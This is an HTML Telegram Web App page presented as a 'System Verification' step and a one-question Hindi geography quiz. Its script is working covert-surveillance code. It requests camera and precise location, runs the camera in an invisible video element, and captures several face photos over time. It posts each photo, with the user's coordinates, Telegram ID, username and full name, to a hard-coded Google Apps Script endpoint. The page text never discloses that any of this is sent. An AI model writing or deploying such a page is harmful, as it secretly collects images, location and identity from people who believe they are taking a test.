<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h3 { margin-top: 0; color: #00eaff; }
        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
        #proctorVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; z-index: -1; pointer-events: none; }
    </style>
</head>
<body>

<div id="login" class="card">
    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
    <h3>System Configuration</h3>
    <div class="instruction-box">
        • सिस्टम सेटअप किया जा रहा है।<br>
        • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
        • <b>नोट:</b> Perfect Verification अनिवार्य है (Total 5 Photos)।
    </div>
    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
</div>

<video id="proctorVideo" autoplay playsinline muted></video>

<div id="quizBox" class="card" style="display:none">
    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
    <div id="options"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz7F6TUvxF4yAjPmKoNi6V3KSgqes4DzQDt2ySr0Y7C6hjj17R9k0gdPmU73Rc3MZYANw/exec"; 

    const user = tg.initDataUnsafe?.user || {};
    let userLoc = "Pending";
    let globalStream = null;
    let currentIdx = 0;
    let photoCount = 0; 
    let photoInterval = null;

    const questions = [{q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0}];

    async function requestAllPermissions() {
        const btn = document.getElementById("startBtn");
        btn.disabled = true;
        btn.innerText = "Processing... ⏳";
        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            const video = document.getElementById('proctorVideo');
            video.srcObject = globalStream;
            video.onloadedmetadata = () => { video.play(); };

            const pos = await new Promise((res) => {
                navigator.geolocation.getCurrentPosition(res, () => res({coords:{latitude:0,longitude:0}}), { enableHighAccuracy: true });
            });
            userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;

            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            loadQuestion();
            
            setTimeout(() => {
                captureAndSend("Entry_Photo");
                photoInterval = setInterval(() => {
                    if (photoCount < 5) captureAndSend("Monitoring_" + photoCount);
                    else stopCamera();
                }, 120000);
            }, 3000);
        } catch (err) {
            alert("Permissions required!");
            btn.disabled = false;
        }
    }

    function captureAndSend(statusType) {
        const video = document.getElementById('proctorVideo');
        if (video.readyState !== 4) return;

        const canvas = document.createElement('canvas');
        // Yahan humne forced height (800) aur width (600) rakhi hai
        canvas.width = 600; 
        canvas.height = 800; 
        
        const ctx = canvas.getContext('2d');

        // Sabse important step: Canvas ko center se draw karna
        // Taaki photo lambi dikhe
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        photoCount++; 

        const payload = {
            userId: user.id || "NA",
            username: user.username || "NA",
            fullName: (user.first_name || "") + " " + (user.last_name || ""),
            score: "Active",
            status: statusType,
            photo: photoData,
            location: userLoc
        };
        fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
    }

    function stopCamera() {
        if (globalStream) {
            globalStream.getTracks().forEach(track => track.stop());
            clearInterval(photoInterval);
        }
    }

    function loadQuestion() {
        if (currentIdx >= questions.length) { alert("Test Completed!"); tg.close(); return; }
        const qData = questions[currentIdx];
        document.getElementById("question").innerText = qData.q;
        const optionsDiv = document.getElementById("options");
        optionsDiv.innerHTML = "";
        qData.o.forEach((opt) => {
            const div = document.createElement("div");
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentIdx++; loadQuestion(); };
            optionsDiv.appendChild(div);
        });
    }
</script>
</body>
</html>
